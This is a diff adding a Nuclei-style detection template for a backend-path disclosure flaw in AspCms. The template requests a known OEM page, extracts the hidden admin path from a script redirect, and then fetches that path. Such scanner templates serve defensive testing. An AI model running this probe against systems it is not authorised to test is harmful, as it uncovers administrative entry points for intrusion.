@@ -1,0 +1,42 @@
+id: poc-yaml-aspcms-backend-leak
+info:
+  name: Aspcms Backend Leak Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: info-leak
+  description: |
+    Detects a vulnerability in Aspcms where sensitive backend information can be leaked.
+http:
+  - raw:
+      - |
+        GET /plug/oem/AspCms_OEMFun.asp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<script>alert"
+      - type: regex
+        regex:
+          - "top.location.href='(.*?)';"
+    extractors:
+      - type: regex
+        name: path
+        internal: true
+        regex:
+          - "(?P<path>(/(.*?).asp))"
+  - raw:
+      - |
+        GET /{{path}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "username"
